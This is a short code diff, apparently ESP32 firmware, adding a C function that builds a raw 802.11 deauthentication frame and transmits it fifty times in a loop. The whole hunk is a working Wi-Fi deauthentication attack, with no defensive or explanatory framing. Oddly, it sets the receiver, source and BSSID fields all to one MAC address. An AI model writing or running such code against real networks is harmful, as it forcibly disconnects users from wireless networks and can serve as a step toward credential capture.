@@ -1,0 +1,15 @@
+void sendDeauth(uint8_t* mac) {
+  uint8_t deauthPacket[26] = {
+    0xC0, 0x00, 0x00, 0x00,              // Type/Subtype: deauth
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],  // Receiver (target)
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],  // Source (AP)
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],  // BSSID (AP)
+    0x00, 0x00,                          // Seq number
+    0x07, 0x00                           // Reason code: 7 = class 3 frame received from nonassociated station
+  };
+
+  for (int i = 0; i < 50; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    delay(1);
+  }
+}
